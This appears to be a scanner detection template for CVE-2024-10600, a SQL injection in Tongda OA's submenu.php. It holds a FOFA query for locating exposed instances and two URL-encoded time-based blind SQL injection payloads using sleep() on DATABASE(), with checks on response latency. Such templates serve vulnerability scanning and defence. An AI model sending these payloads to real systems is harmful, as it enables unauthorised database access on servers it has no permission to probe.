id: CVE-2024-10600

info:
  name: 通达OA前台submenu.php SQL注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    pda/appcenter/submenu.php 未包含inc/auth.inc.php且 $appid 参数未用'包裹导致前台SQL注入
    fofa: app="TDXK-通达OA" && icon_hash="-759108386"
  tags: cve,cve2024,sqli,tongda
  created: 2024/11/24

rules:
  r0:
    request:
      method: GET
      path: /appid=1%20and%20(if%20(substr(DATABASE(),1,1)%20=%20char(116),%20sleep(10),%200))%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
    expression: |
      response.status == 200 && 
      response.latency <= 11000 &&  
      response.latency >= 10000
  r1:
    request:
      method: GET
      path: /appid=1%20and%20(if%20(substr(DATABASE(),1,1)%20=%20char(116),%20sleep(13),%200))%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
    expression: |
      response.status == 200 && 
      response.latency <= 14000 &&  
      response.latency >= 13000
expression: r0() && r1()
